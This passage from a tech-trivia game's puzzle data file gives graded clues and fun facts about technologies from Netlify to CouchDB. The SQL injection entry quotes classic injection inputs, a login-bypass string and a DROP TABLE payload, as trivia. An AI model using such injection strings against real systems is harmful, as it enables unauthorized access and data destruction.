      'It is a distributed in-memory key-value cache.',
      "The caching daemon whose name ends in a 'd'."
    ],
    funFact: 'Its author, who also created LiveJournal, later joined Google and worked on the Go team.'
  },
  220: {
    clues: [
      'Two Danish founders, Mathias Biilmann and Christian Bach, started it in San Francisco in 2014.',
      "Its CEO coined the term 'Jamstack'.",
      'You could deploy a site by dragging a folder onto its web page.',
      'Every pull request gets a deploy preview.',
      'It acquired the company behind Gatsby in 2023.',
      'The web hosting platform with a teal logo, a big rival of Vercel.'
    ],
    funFact: "Its co-founder Mathias Biilmann coined 'Jamstack', short for JavaScript, APIs and Markup."
  },
  221: {
    clues: [
      'Sebastian McKenzie started it in 2014 under a name that described exactly what it did: 6to5.',
      'It was renamed in 2015 because it could do much more than convert one version to another.',
      'It turns modern JavaScript into code older browsers understand.',
      'Its preset-env picks transforms based on the browsers you target.',
      'JSX and TypeScript can also be stripped out by it.',
      'The JavaScript compiler named after a biblical tower of confused languages.'
    ],
    funFact: 'Its name is a reference to the Tower of Babel, where people suddenly spoke languages nobody else understood.'
  },
  222: {
    clues: [
      'The Chrome DevTools team at Google released it in 2017.',
      'It controls a browser through the DevTools Protocol.',
      'It made headless Chrome easy to script from Node.js.',
      'Calls like page.goto() and page.screenshot() are its bread and butter.',
      'Its original authors later moved to Microsoft and built Playwright.',
      'The Node.js library for controlling Chrome, named after someone who works a marionette.'
    ],
    funFact: 'It is widely used for generating PDFs and screenshots of web pages, not just for testing.'
  },
  223: {
    clues: [
      'Bob Metcalfe and David Boggs developed it at Xerox PARC in 1973.',
      "Its name refers to the 'luminiferous ether', once thought to carry light.",
      'It was standardised as IEEE 802.3.',
      'Early versions shared one cable and detected collisions.',
      'Today you plug it in with an RJ45 connector.',
      'The standard for wired local networks.'
    ],
    funFact: 'Bob Metcalfe received the Turing Award in 2022 for inventing it.'
  },
  224: {
    clues: [
      'The US Department of Defense commissioned it to replace hundreds of languages in its systems.',
      'A team led by Jean Ichbiah won the design competition around 1979.',
      'It is strongly typed and popular in avionics, railways and other safety-critical systems.',
      'A subset called SPARK can be formally proven correct.',
      'Its military standard number, MIL-STD-1815, is a birth year.',
      "The language named after Lord Byron's daughter, often called the first programmer."
    ],
    funFact: 'Its standard number 1815 is the year Ada Lovelace was born.'
  },
  225: {
    clues: [
      'Apple released it in 2003 as the successor to Project Builder from NeXT.',
      'Its Interface Builder dates back to NeXT in the 1980s.',
      'Its Instruments app profiles memory, CPU and energy use.',
      'It includes simulators for iPhone, iPad, Apple Watch and more.',
      'You need it, and a Mac, to publish an app to the App Store.',
      "Apple's IDE for building apps for its platforms."
    ],
    funFact: 'Interface Builder, still part of it today, was first created in 1988 for the NeXT computer.'
  },
  226: {
    clues: [
      'Paul Copplestone and Ant Wilson founded it in 2020.',
      'It started out calling itself an open-source alternative to Firebase.',
      'Every project is a full Postgres database.',
      'Row Level Security policies decide who can read and write each row.',
      'Codeguessr keeps its puzzles and player stats in it.',
      'The open-source backend platform built on Postgres, with a green lightning bolt as its logo.'
    ],
    funFact: 'The puzzle you are playing right now was most likely loaded from it.'
  },
  227: {
    clues: [
      'A 2014 JSConf EU talk by Philip Roberts explaining it has millions of views.',
      'It lets a single thread handle many things by never blocking.',
      'Promise callbacks, as microtasks, run before the next setTimeout callback.',
      'In Node.js it is implemented by libuv.',
      'setTimeout(fn, 0) does not run right away because of it.',
      "The mechanism that runs JavaScript's queued callbacks one by one."
    ],
    funFact: "Philip Roberts' talk was titled 'What the heck is the event loop anyway?'."
  },
  228: {
    clues: [
      'Matthew Prince, Lee Holloway and Michelle Zatlyn founded it, and it launched in 2010.',
      'A wall of lava lamps in its San Francisco office helps generate random numbers.',
      'Its public DNS resolver has the address 1.1.1.1.',
      'Its Workers run JavaScript at the edge, in hundreds of cities.',
      'A large share of all websites sit behind its network and DDoS protection.',
      'The CDN and security company with an orange cloud as its logo.'
    ],
    funFact: 'A camera films its wall of about 100 lava lamps, and the unpredictable images are mixed into its source of randomness for encryption.'
  },
  229: {
    clues: [
      'Jim Roskind designed it at Google around 2012.',
      'It runs on UDP instead of TCP.',
      'Encryption with TLS 1.3 is built in, not added on top.',
      'A connection survives when your phone switches from Wi-Fi to mobile data.',
      'HTTP/3 runs on it, and the IETF standardised it in RFC 9000 in 2021.',
      "The transport protocol whose name sounds like 'quick'."
    ],
    funFact: 'Its name started as an acronym for Quick UDP Internet Connections, but the IETF version officially treats it as just a name.'
  },
  230: {
    clues: [
      'A white paper by Satoshi Nakamoto was published on 31 October 2008.',
      'Its first block contains a newspaper headline about a bank bailout.',
      'Its supply is capped at 21 million.',
      'In 2010 someone paid 10,000 of its units for two pizzas.',
      'Miners compete with proof of work to add new blocks.',
      'The first cryptocurrency.'
    ],
    funFact: '22 May is celebrated as Pizza Day, after Laszlo Hanyecz bought two pizzas with 10,000 of its coins in 2010.'
  },
  231: {
    clues: [
      'Kyle Mathews started it in 2015.',
      'It pulls content from anywhere into a single GraphQL data layer.',
      'It builds React sites into static pages, with a large plugin ecosystem.',
      'Netlify acquired the company behind it in 2023.',
      'For a few years it was the go-to static site generator for React.',
      "The React framework named after F. Scott Fitzgerald's 'Great' millionaire."
    ],
    funFact: 'Its name comes from the novel The Great Gatsby.'
  },
  232: {
    clues: [
      'David P. Reed specified it in 1980, in an RFC of about three pages.',
      'Its header is just eight bytes.',
      'It sends datagrams with no handshake, no ordering and no delivery guarantee.',
      'DNS, online games and video calls rely on it for speed.',
      'QUIC, and with it HTTP/3, is built on top of it.',
      'The User Datagram Protocol.'
    ],
    funFact: "A classic joke: 'I'd tell you a joke about it, but you might not get it.'"
  },
  233: {
    clues: [
      'Blake Ross and Dave Hyatt started it as a lean spin-off of the Mozilla suite.',
      'It was first called Phoenix, then Firebird, before trademark problems forced a third name.',
      'Version 1.0 arrived in November 2004 and took on Internet Explorer.',
      'Its Quantum update in 2017 brought in components written in Rust.',
      'Its engine is Gecko, and Mozilla makes it.',
      'The browser named after a nickname of the red panda.'
    ],
    funFact: 'A firefox is another name for the red panda, even though the logo is usually seen as a fox.'
  },
  234: {
    clues: [
      'The W3C published its first version in 2001.',
      'It is an XML-based format.',
      'Its path element uses a tiny language of letters like M, L, C and Z.',
      'The viewBox attribute defines its coordinate system.',
      'Icons and logos in this format stay sharp at any size.',
      'The Scalable Vector Graphics format.'
    ],
    funFact: 'Because it is plain text, you can style and animate it with CSS and even edit it by hand.'
  },
  235: {
    clues: [
      'Jeremy Ashkenas released it in 2010.',
      'It was extracted from DocumentCloud, a tool for journalists.',
      'It gave structure with models, collections, views and a router.',
      'Early versions of Trello and Airbnb used it.',
      'It depends on Underscore.js, by the same author.',
      'The minimal MVC library whose name means a spine.'
    ],
    funFact: 'Its annotated source code, readable top to bottom, taught a generation of developers how a framework works.'
  },
  236: {
    clues: [
      'It was first published in 1963.',
      'It uses 7 bits, for 128 characters.',
      'The capital letter A is number 65, and a space is 32.',
      'The first 32 codes are invisible control characters, such as line feed and bell.',
      'Pictures made from its characters are called art.',
      'The American Standard Code for Information Interchange.'
    ],
    funFact: 'DEL is code 127, all seven bits set, because on paper tape you could erase a character by punching out every hole.'
  },
  237: {
    clues: [
      'Torkel Ödegaard started it in 2014.',
      'It began as a fork of the dashboard of Kibana.',
      'It does not store data itself but queries data sources such as Prometheus.',
      "Its company's stack of Loki, Tempo and Mimir spells out a famous code review acronym with it.",
      'Operations teams put its dashboards on big screens.',
      'The open-source dashboarding and observability tool with an orange logo.'
    ],
    funFact: "Its company likes to call its stack of Loki, Grafana, Tempo and Mimir the LGTM stack: 'looks good to me'."
  },
  238: {
    clues: [
      'It launched in 2012.',
      'It builds on ideas from a famous 2007 paper about a highly available key-value store.',
      'Every item is found by a partition key and an optional sort key.',
      'It promises single-digit millisecond latency at any scale.',
      "It handles the huge traffic peaks of Amazon's Prime Day.",
      "AWS's fully managed NoSQL database."
    ],
    funFact: 'The 2007 paper it builds on also inspired Cassandra and Riak.'
  },
  239: {
    clues: [
      'Carson Gross released it in 2020 as the successor to intercooler.js.',
      'It argues that hypermedia, not JSON, should drive your application.',
      'Attributes such as hx-get, hx-post and hx-swap do the work.',
      'The server returns HTML fragments that replace parts of the page.',
      'Its memes and cheeky social media account are part of its popularity.',
      'The small library that gives HTML its own AJAX, named with four lowercase letters.'
    ],
    funFact: 'Its author also wrote a free book about the approach, called Hypermedia Systems.'
  },
  240: {
    clues: [
      'It started as an experiment by Steve Sanderson in 2017.',
      'It runs C# in the browser using WebAssembly.',
      'Its components live in .razor files that mix markup and C#.',
      'One hosting model keeps state on the server and updates the page over SignalR.',
      "It is Microsoft's answer to single-page apps without JavaScript.",
      'The .NET web UI framework whose name joins Browser and Razor.'
    ],
    funFact: "Its name is a blend of Browser and Razor, the .NET templating syntax, and it sounds like 'blazer'."
  },
  241: {
    clues: [
      'Matt Zabriskie released it in 2014.',
      'It is a promise-based HTTP client that works in both the browser and Node.js.',
      'Interceptors let you change every request or response in one place.',
      'It turns JSON responses into objects automatically.',
      'For years it was the default choice before fetch arrived in Node.js.',
      "The popular JavaScript HTTP client whose name is Greek for 'worthy'."
    ],
    funFact: 'Node.js only got a built-in fetch in version 18, in 2022, which is one reason it stayed so popular for so long.'
  },
  242: {
    clues: [
      'Max Howell created it in 2009.',
      'Its vocabulary is all about beer: formulae, casks, taps, bottles and the cellar.',
      'On Apple Silicon Macs it installs into /opt.',
      'Its casks install graphical apps as well as command-line tools.',
      "It calls itself 'the missing package manager for macOS'.",
      'The Mac package manager whose name means beer made at home.'
    ],
    funFact:
      'In 2015 its creator tweeted that Google had turned him down because he could not invert a binary tree on a whiteboard, even though 90% of their engineers used his software.'
  },
  243: {
    clues: [
      'Travis Oliphant created it around 2005 by merging two older libraries, Numeric and Numarray.',
      'Its core type is the n-dimensional array, ndarray.',
      'Broadcasting lets you combine arrays of different shapes without writing loops.',
      'pandas, SciPy and scikit-learn are all built on top of it.',
      'People usually import it as np.',
      'The fundamental package for numerical computing in Python.'
    ],
    funFact: 'It was used in the analysis behind the first image of a black hole in 2019 and the detection of gravitational waves.'
  },
  244: {
    clues: [
      'It grew out of the Web Inspector from the WebKit project.',
      'It opens with F12, or Cmd+Option+I on a Mac.',
      'Its panels include Elements, Console, Network, Sources and Performance.',
      'Its protocol is what Puppeteer and many other tools use to control the browser.',
      'Lighthouse audits run from one of its tabs.',
      "The built-in developer tools of Google's browser."
    ],
    funFact: 'Its protocol became so widely used that Firefox implemented part of it for a few years, so automation tools could control Firefox too.'
  },
  245: {
    clues: [
      'Hampton Catlin designed it in 2006, and Natalie Weizenbaum wrote much of it.',
      'Its original syntax used indentation instead of braces.',
      'Its newer syntax, with braces, is a superset of CSS.',
      'Variables start with $, and it has mixins, nesting and @use.',
      'Its main implementation today is written in Dart.',
      'The CSS preprocessor whose name stands for Syntactically Awesome Style Sheets.'
    ],
    funFact: 'Its original Ruby implementation reached end of life in 2019, and the Dart version has been the reference ever since.'
  },
  246: {
    clues: [
      'Three developers founded it in 2007, first as a way to host Ruby apps.',
      'Deploying was as simple as a git push to its remote.',
      'Your app runs in lightweight containers called dynos.',
      'A Procfile tells it which processes to start.',
      'Salesforce bought it in 2010, and its free plan ended in 2022.',
      'The pioneering platform-as-a-service with a purple logo.'
    ],
    funFact: "Its name is a blend of 'heroic' and 'haiku'."
  },
  247: {
    clues: [
      'Jared Palmer created it, and Vercel acquired it in December 2021.',
      'It caches the output of tasks, so nothing is ever built twice.',
      'Its cache can be shared with teammates and CI.',
      'Tasks and their dependencies are described in a turbo.json file.',
      'It was ported from Go to Rust.',
      'The monorepo build system with a turbocharged name.'
    ],
    funFact: 'Its remote cache means a CI run can skip a build entirely if a teammate already built the exact same code.'
  },
  248: {
    clues: [
      'Guy Steele and Gerald Sussman created it at MIT in 1975.',
      'It was meant to be called Schemer, but the operating system only allowed six-character file names.',
      'Its standard requires proper tail calls, so recursion can replace loops.',
      "It gave the world call/cc, a way to capture 'the rest of the program' as a value.",
      'The classic textbook SICP teaches programming with it.',
      'The minimalist Lisp dialect whose name also means a plan or plot.'
    ],
    funFact: 'It follows two earlier AI languages called Planner and Conniver, which is why its authors wanted a name in the same spirit.'
  },
  249: {
    clues: [
      'Chris Lattner and Vikram Adve started it at the University of Illinois around 2000.',
      'Its heart is an intermediate representation that many optimisations work on.',
      'Its C and C++ front end is called Clang.',
      'Swift, Rust and Julia all use it to generate machine code.',
      'Its name once stood for Low Level Virtual Machine, but it is no longer an acronym.',
      'The modular compiler infrastructure with a dragon as its logo.'
    ],
    funFact: 'Chris Lattner went on to create Swift at Apple, and later the Mojo language.'
  },
  250: {
    clues: [
      'Jarkko Oikarinen created it at the University of Oulu, Finland, in 1988.',
      'People used it to share news during the 1991 Soviet coup attempt.',
      'Channel names start with #, and commands with a slash, like /join.',
      'Channel operators, or ops, can kick and ban users.',
      'Many open-source projects hung out on it for decades, on networks like Libera.Chat.',
      'Internet Relay Chat.'
    ],
    funFact: 'During the 1991 coup attempt in Moscow, users relayed live reports through it while traditional media were censored.'
  },
  251: {
    clues: [
      'Matt Mullenweg and Mike Little released it in 2003.',
      'It started as a fork of a blogging tool called b2/cafelog.',
      'Its major releases are named after jazz musicians.',
      'Its block editor was code-named Gutenberg.',
      'It powers over 40 percent of all websites.',
      'The PHP content management system that started as a blogging platform.'
    ],
    funFact: 'Its releases are named after jazz musicians, such as Miles Davis, Duke Ellington and Billie Holiday.'
  },
  252: {
    clues: [
      'Stuart Haber and W. Scott Stornetta described chained, time-stamped documents in 1991.',
      "Satoshi Nakamoto's 2008 paper spoke of a 'chain of blocks'.",
      'Every block includes the hash of the previous one.',
      'Changing an old record would mean redoing all the work after it.',
      'Bitcoin and Ethereum are built on it.',
      'The append-only ledger of linked blocks.'
    ],
    funFact: "Since 1995, Haber and Stornetta's company has published a hash in the classified ads of The New York Times every week."
  },
  253: {
    clues: [
      "Facebook's AI research lab released it in 2016.",
      'It is a Python successor to a framework written in Lua.',
      'It builds its computation graph as the code runs, which makes debugging feel natural.',
      'Its autograd engine computes gradients of tensors automatically.',
      'Most modern AI research papers use it.',
      'The deep learning library with a flame for a logo, whose name starts with Py.'
    ],
    funFact: 'It has been governed by its own foundation under the Linux Foundation since 2022.'
  },
  254: {
    clues: [
      'It was released in 1996 by a French research institute, INRIA.',
      'It added objects to an older language in the ML family.',
      'Its type inference means you rarely have to write a type down.',
      'The trading firm Jane Street is its best-known industrial user.',
      'The first compiler of Rust was written in it.',
      'The French functional language with a camel as its logo.'
    ],
    funFact: 'Before Rust could compile itself, its compiler was written in this language.'
  },
  255: {
    clues: [
      'Facebook built it in 2008 to power inbox search.',
      "One of its creators had co-authored Amazon's Dynamo paper.",
      'Every node in its ring is equal; there is no leader.',
      'You choose the consistency level per query, and query it with CQL.',
      'Apple and Netflix run some of its largest clusters.',
      'The wide-column database named after a Trojan prophet nobody believed.'
    ],
    funFact: 'Its name, after a prophet whose true predictions were never believed, is often read as a joke aimed at Oracle.'
  },
  256: {
    clues: [
      'It began with a 2002 paper by Jeffrey Snover called the Monad Manifesto.',
      'Its code name was Monad, and version 1.0 shipped in 2006.',
      'Its pipeline passes objects instead of plain text.',
      'Its commands follow a Verb-Noun pattern, like Get-ChildItem.',
      'It has been open source and cross-platform since 2016.',
      "Microsoft's shell and scripting language, the successor to cmd.exe."
    ],
    funFact: 'Its scripts end in .ps1, a leftover from a time when a version 2 was expected to need its own extension.'
  },
  257: {
    clues: [
      'It was first shown in 2015 under the code name Sky.',
      "It draws every pixel itself instead of using the platform's native controls.",
      'In it, everything is a widget.',
      'Its hot reload shows code changes in a running app within a second.',
      'Its apps are written in Dart.',
      "Google's cross-platform UI toolkit, named after a quick flapping of wings."
    ],
    funFact: 'Its first public demo, as Sky, aimed at a consistent 120 frames per second on Android.'
  },
  258: {
    clues: [
      'Brad Cox and Tom Love created it in the early 1980s.',
      'It added Smalltalk-style messaging on top of an existing systems language.',
      'Calling a method looks like [object message], with square brackets.',
      'NeXT licensed it in 1988, and its class names still start with NS.',
      'It was the main language for Mac and iPhone apps until Swift arrived.',
      "Apple's older app language: C with objects bolted on."
    ],
    funFact: "The NS prefix on classes such as NSString is a leftover from NeXTSTEP, the operating system Steve Jobs's company NeXT built with it."
  },
  259: {
    clues: [
      'It started at UC Berkeley in 2010.',
      'It is an open instruction set that anyone can use without paying royalties.',
      'It has a small base plus optional extensions, such as M for multiply.',
      'Its governing organisation moved to Switzerland in 2020.',
      "Its name is pronounced 'risk five'.",
      'The open instruction set architecture with a Roman numeral in its name.'
    ],
    funFact: 'It was the fifth RISC design to come out of Berkeley, which is where the Roman numeral comes from.'
  },
  260: {
    clues: [
      'Fabrice Bellard started it in 2000.',
      'Its libavcodec library decodes almost every audio and video format ever made.',
      'VLC, Chrome and YouTube all use its code.',
      'A typical command starts with -i input.mp4.',
      "Its name combines 'fast forward' with a video standard.",
      'The Swiss army knife for converting audio and video from the command line.'
    ],
    funFact: 'Its creator, Fabrice Bellard, also wrote the emulator QEMU and once set a world record for calculating digits of pi on a desktop PC.'
  },
  261: {
    clues: [
      "Matei Zaharia started it at UC Berkeley's AMPLab in 2009.",
      'It keeps data in memory between steps, unlike classic MapReduce.',
      'Its original core abstraction was the resilient distributed dataset, or RDD.',
      'Its creators founded Databricks in 2013.',
      'It processes huge datasets across clusters, in Scala, Python, Java or SQL.',
      "Apache's big data engine, whose name is a tiny flash of fire."
    ],
    funFact: 'In 2014 it set a world record by sorting 100 terabytes three times faster than the previous Hadoop record, using a tenth of the machines.'
  },
  262: {
    clues: [
      'CoreOS released it in 2013.',
      'It uses the Raft consensus algorithm to keep replicas in agreement.',
      'It is a strongly consistent, distributed key-value store.',
      'Kubernetes keeps all of its cluster state in it.',
      "Its name combines a Unix config directory with a 'd' for distributed.",
      'The key-value store at the heart of every Kubernetes cluster, with a four-letter lowercase name.'
    ],
    funFact: "Its name is the Unix /etc folder, where configuration lives, plus a 'd' for distributed."
  },
  263: {
    clues: [
      'Donald Chamberlin and Raymond Boyce designed it at IBM in the 1970s.',
      'Its first name had to change because a British aircraft company owned the trademark.',
      "It is built on Edgar Codd's relational model.",
      'You say what you want, not how to get it: SELECT, FROM, WHERE.',
      'Every relational database speaks a dialect of it.',
      "The Structured Query Language, pronounced by some as 'sequel'."
    ],
    funFact: 'It was first called SEQUEL, but the name was already a trademark of the aircraft company Hawker Siddeley, so the vowels were dropped.'
  },
  264: {
    clues: [
      'Andy Stanford-Clark and Arlen Nipper designed it in 1999.',
      'It was meant to monitor oil pipelines over expensive satellite links.',
      'Clients publish and subscribe to topics through a central broker.',
      'Topics use slashes, and + and # are wildcards.',
      'It is the go-to messaging protocol for the Internet of Things.',
      'The lightweight publish/subscribe protocol with a four-letter name starting with MQ.'
    ],
    funFact: "Its three quality-of-service levels range from 'at most once' to 'exactly once'."
  },
  265: {
    clues: [
      'A linguist created it in 1987 to make report processing on Unix easier.',
      "Its motto is 'there's more than one way to do it'.",
      'Its variables start with sigils: $ for scalars, @ for arrays and % for hashes.',
      'Its package archive CPAN was one of the first of its kind.',
      "Larry Wall's language, famous for its regular expressions and its camel book.",
      'The scripting language whose planned sixth version was renamed Raku.'
    ],
    funFact: "Larry Wall wanted to call it Pearl, but a language with that name already existed, so he dropped the 'a'."
  },
  266: {
    clues: [
      'Lee McMahon wrote it at Bell Labs in 1973 and 1974.',
      'It edits text as it flows past, line by line.',
      'Its best-known command is s/old/new/g.',
      'Its -i flag for editing in place behaves differently on macOS and Linux.',
      'It is often paired with awk and grep in shell scripts.',
      'The Unix stream editor, with a three-letter name.'
    ],
    funFact: "Because BSD's version needs an argument after -i and GNU's does not, portable scripts often avoid in-place editing altogether."
  },
  267: {
    clues: [
      'The brothers Alexandre and Sébastien Chopin created it in 2016.',
      'It was inspired by a React framework with a similar-sounding name.',
      'Its server engine is called Nitro.',
      'File-based routing, auto-imports and server-side rendering come built in.',
      'It is the meta-framework for Vue.',
      "Vue's answer to Next.js, with a four-letter name."
    ],
    funFact: 'It was announced in October 2016, the same month as Next.js, the framework that inspired it.'
  },
  268: {
    clues: [
      'James Strachan started it in 2003 as a dynamic language for the JVM.',
      'Any Java file is, with few exceptions, also valid code in it.',
      'Jenkins pipelines are written in a domain-specific language built on it.',
      'For years, Gradle build files were written in it before Kotlin became an option.',
      'It is now an Apache project.',
      'The JVM language whose name is 1960s slang for cool.'
    ],
    funFact: 'Its creator later wrote that if he had seen the book Programming in Scala back in 2003, he would probably never have created it.'
  },
  269: {
    clues: [
      'Steve Wilhite created it at CompuServe in 1987.',
      'It is limited to a palette of 256 colours.',
      'Its 1989 version added animation, which is why it still lives on.',
      'The patent on its compression algorithm led to the creation of PNG.',
      'Its creator insisted it should be pronounced with a soft g, like the peanut butter brand.',
      'The Graphics Interchange Format, famous for looping animations.'
    ],
    funFact:
      "When Steve Wilhite received a Webby lifetime achievement award in 2013, his five-word acceptance speech was a slide saying it is pronounced 'jif'."
  },
  270: {
    clues: [
      'Its first version, in 1995, was based on licensed code from Spyglass Mosaic.',
      'Bundling it with Windows led to a famous antitrust case.',
      'Around 2003 it had roughly 95 percent of the browser market.',
      'Web developers spent years writing hacks for its sixth version.',
      'Microsoft finally retired it in June 2022.',
      "Microsoft's old browser with a blue 'e' logo."
    ],
    funFact: 'XMLHttpRequest, the basis of modern web apps, was first shipped in it, in version 5.'
  },
  271: {
    clues: [
      "It replaced AppCache, which one famous article called a 'douchebag'.",
      'It is a script that runs separately from the page, even when the page is closed.',
      'It intercepts every network request and can answer from a cache.',
      'It only works over HTTPS.',
      'Codeguessr uses one to stay playable offline.',
      'The browser script that acts as a programmable network proxy for your web app.'
    ],
    funFact: "Jake Archibald, who helped design it, wrote the article 'Application Cache is a Douchebag' about the API it replaced."
  },
  272: {
    clues: [
      'John D. Hunter, a neuroscientist, created it in 2003.',
      'He wanted to replace a commercial tool for plotting brain signals from epilepsy patients.',
      'Its pyplot interface deliberately mimics MATLAB.',
      'plt.plot() followed by plt.show() is how countless charts begin.',
      "Seaborn and pandas' .plot() are built on it.",
      'The classic Python plotting library whose name nods to MATLAB.'
    ],
    funFact: 'A fellowship for scientific Python developers is named after its creator, John Hunter, who died in 2012.'
  },
  273: {
    clues: [
      'Jeremy Ashkenas released it in 2009.',
      "Its motto was 'it's just JavaScript'.",
      'Its thin arrows (->) and fat arrows (=>) came before JavaScript had arrow functions.',
      'Rails 3.1 made it the default for new applications.',
      'Much of what it offered, such as classes and destructuring, landed in ES2015.',
      'The language that compiles to JavaScript, named after a hot drink.'
    ],
    funFact: 'Its creator also wrote Backbone.js and Underscore.js.'
  },
  274: {
    clues: [
      'Sophie Wilson and Steve Furber designed its first chip at Acorn Computers in 1985.',
      'Its name first meant Acorn RISC Machine.',
      'Its company does not make chips; it licenses designs to others.',
      'Almost every smartphone runs on it.',
      'Apple moved the Mac to it in 2020 with the M1.',
      'The low-power processor architecture from Cambridge, with a three-letter name that is also a body part.'
    ],
    funFact: 'Its first chip used so little power that it kept running on leakage current from other chips, even with its own power line disconnected.'
  },
  275: {
    clues: [
      'Its creator released it in Japan in 1995 and said it was designed to make programmers happy.',
      "Its name follows another scripting language's name, one birthstone month later.",
      'In it, even numbers are objects, so 5.times { ... } is a perfectly normal loop.',
      'Its libraries are called gems.',
      "Yukihiro 'Matz' Matsumoto is its creator.",
      'The language behind Rails, named after a red gemstone.'
    ],
    funFact: "Matz picked the name because it was a colleague's birthstone; the ruby is July's birthstone, right after June's pearl."
  },
  276: {
    clues: [
      'Dmytro Zaporozhets started it in Ukraine in 2011.',
      'A Dutch co-founder, Sid Sijbrandij, turned it into a company.',
      'It is famous for being fully remote and publishing its handbook online.',
      'In 2017 an engineer accidentally deleted a production database, and the recovery was livestreamed.',
      'Its pipelines are configured in a YAML file in the root of the repository.',
      'The DevOps platform and GitHub rival with a fox-like tanuki as its logo.'
    ],
    funFact: 'During its 2017 database outage it shared a public Google Doc and a YouTube livestream while the team restored the data.'
  },
  277: {
    clues: [
      'Kitware created it around 2000 for a medical imaging toolkit.',
      'It does not build anything itself; it generates files for other build tools.',
      'It can generate Makefiles, Ninja files or Visual Studio solutions.',
      'Modern style is all about targets and target_link_libraries.',
      'Its project files are called CMakeLists.txt.',
      'The cross-platform build system generator for C and C++.'
    ],
    funFact: 'The toolkit it was built for, ITK, was funded by the US National Library of Medicine.'
  },
  278: {
    clues: [
      'It was born in 2005 at a design institute in Ivrea, Italy.',
      'It was meant to let art and design students build electronics cheaply.',
      'Its programs are called sketches.',
      'Every program has a setup() function and a loop() function.',
      'Its boards, such as the Uno, are the classic starting point for hobby electronics.',
      'The open-source microcontroller platform named after a bar in Ivrea.'
    ],
    funFact: 'The founders often met in a bar named after Arduin, a king of Italy around the year 1000, and named the project after it.'
  },
  279: {
    clues: [
      'Jon Skinner, a former Google engineer from Australia, released it in 2008.',
      'It made multiple cursors and a minimap on the side popular.',
      "Its 'Goto Anything' opens files with a few keystrokes.",
      'Its evaluation never expires, but a dialog regularly asks you to buy a licence.',
      'Before VS Code, it was the fashionable editor for web developers.',
      'The fast code editor whose first word means supremely beautiful.'
    ],
    funFact: "Many developers used it for years without paying, clicking away the same 'please buy a licence' dialog over and over."
  },
  280: {
    clues: [
      'It was first released in 1993, growing out of 386BSD.',
      'It traces its roots to the Berkeley Software Distribution of Unix.',
      'Its mascot is a little red daemon called Beastie.',
      'Jails, ZFS and a huge ports collection are among its strengths.',
      'Netflix streams much of its video from servers running it, and the PlayStation 4 is based on it.',
      'The best-known free BSD operating system.'
    ],
    funFact: 'Sony based the operating systems of the PlayStation 4 and 5 on it.'
  },
  281: {
    clues: [
      'It was first publicly documented in the hacker magazine Phrack in 1998.',
      "The classic example types ' OR '1'='1 into a login form.",
      "An xkcd comic features a boy named Robert'); DROP TABLE Students;--.",
      'Prepared statements with parameters prevent it.',
      'It has been near the top of the OWASP Top 10 for decades.',
      'The attack that smuggles database commands into user input.'
    ],
    funFact: "The boy in xkcd comic 327 is known as 'Little Bobby Tables'."
  },
  282: {
    clues: [
      'John Warnock described the idea in a 1991 paper called the Camelot Project.',
      'Adobe released it in 1993, based on PostScript.',
      'It became an open ISO standard in 2008.',
      'It looks the same on every screen and printer.',
      'Acrobat Reader was the classic way to open it.',
      'The Portable Document Format.'
    ],
    funFact: 'At first you had to buy software even to view these files; adoption took off once Adobe made its Reader free in 1994.'
  },
  283: {
    clues: [
      'Nicholas Marriott started it in 2007, and it became part of OpenBSD.',
      'It is a modern alternative to GNU Screen.',
      'Its sessions keep running after you disconnect from SSH.',
      'Its default prefix key is Ctrl-b, followed by keys such as % to split a pane.',
      'Sessions contain windows, and windows contain panes.',
      'The terminal multiplexer.'
    ],
    funFact: 'Many developers keep a session running on a server for months, reattaching to it from wherever they are.'
  },
  284: {
    clues: [
      'A committee of US government and industry people designed it in 1959.',
      'It was meant to read almost like English, with verbs like ADD, MOVE and PERFORM.',
      'Its programs are split into divisions, such as DATA and PROCEDURE.',
      "Grace Hopper's earlier FLOW-MATIC language strongly influenced it.",
      'Banks and governments still run it on mainframes.',
      'The COmmon Business-Oriented Language.'
    ],
    funFact: 'In April 2020 the governor of New Jersey publicly asked for volunteers who knew this language, to keep unemployment systems running.'
  },
  285: {
    clues: [
      'Isaac Z. Schlueter created it in 2010.',
      'In 2016, the removal of an eleven-line package called left-pad broke builds around the world.',
      'GitHub, and with it Microsoft, bought the company behind it in 2020.',
      'It reads package.json and fills a folder called node_modules.',
      'It ships with Node.js, and its sibling npx runs packages without installing them.',
      'The default package manager for JavaScript, with a three-letter lowercase name.'
    ],
    funFact: 'Officially its name is not an abbreviation, and its website has long joked about what it might stand for.'
  },
  286: {
    clues: [
      'Ricardo Cabello, better known as Mr.doob, started it in 2010.',
      'It was first written in ActionScript before moving to JavaScript.',
      'Every project needs a scene, a camera and a renderer.',
      'It hides most of the pain of raw WebGL.',
      'Countless 3D product viewers and award-winning websites use it.',
      'The JavaScript 3D library whose name starts with a number.'
    ],
    funFact: 'Its creator is known online as Mr.doob, and his experiments site was a showcase for early browser 3D.'
  },
  287: {
    clues: [
      'Jason Huggins started it at ThoughtWorks in 2004.',
      'Its name was a joke about a competing product from Mercury Interactive.',
      'Its WebDriver API became a W3C standard in 2018.',
      'Grid runs its tests on many browsers and machines in parallel.',
      'For about fifteen years it was the default tool for browser test automation.',
      'The browser automation tool named after a chemical element.'
    ],
    funFact: 'Its name was a joke: the element selenium is used to treat mercury poisoning, and the big rival at the time was Mercury Interactive.'
  },
  288: {
    clues: [
      'David L. Mills designed it in the early 1980s.',
      'It is one of the oldest internet protocols still in use.',
      'Its servers are arranged in strata, with atomic clocks and GPS at stratum 0.',
      'It uses UDP port 123.',
      "It keeps your computer's clock accurate to within milliseconds.",
      'The Network Time Protocol.'
    ],
    funFact: "Its creator, David Mills, was nicknamed 'Father Time' for his work on it."
  },
  289: {
    clues: [
      "Paul Dix's company released it in 2013.",
      'It is built for timestamped data such as sensor readings and metrics.',
      "Data is written in a simple 'line protocol'.",
      'It was written in Go, and its third version was rebuilt in Rust.',
      'It was the I in the TICK stack.',
      'The time-series database whose name means an arrival of many things.'
    ],
    funFact: 'The TICK stack stood for Telegraf, it, Chronograf and Kapacitor.'
  },
  290: {
    clues: [
      'Mike Bostock, Vadim Ogievetsky and Jeff Heer released it at Stanford in 2011.',
      'It succeeded an earlier visualisation toolkit called Protovis.',
      'Its data joins are built around enter, update and exit.',
      'It usually draws charts by binding data to SVG elements.',
      'Its main author made many interactive graphics for The New York Times with it.',
      'The Data-Driven Documents library.'
    ],
    funFact: 'Mike Bostock later co-founded Observable, a notebook platform for exploring data with JavaScript.'
  },
  291: {
    clues: [
      'Damien Katz started it in 2005, and it joined Apache in 2008.',
      'It is written in Erlang.',
      'Every document is JSON, and you talk to it over plain HTTP.',
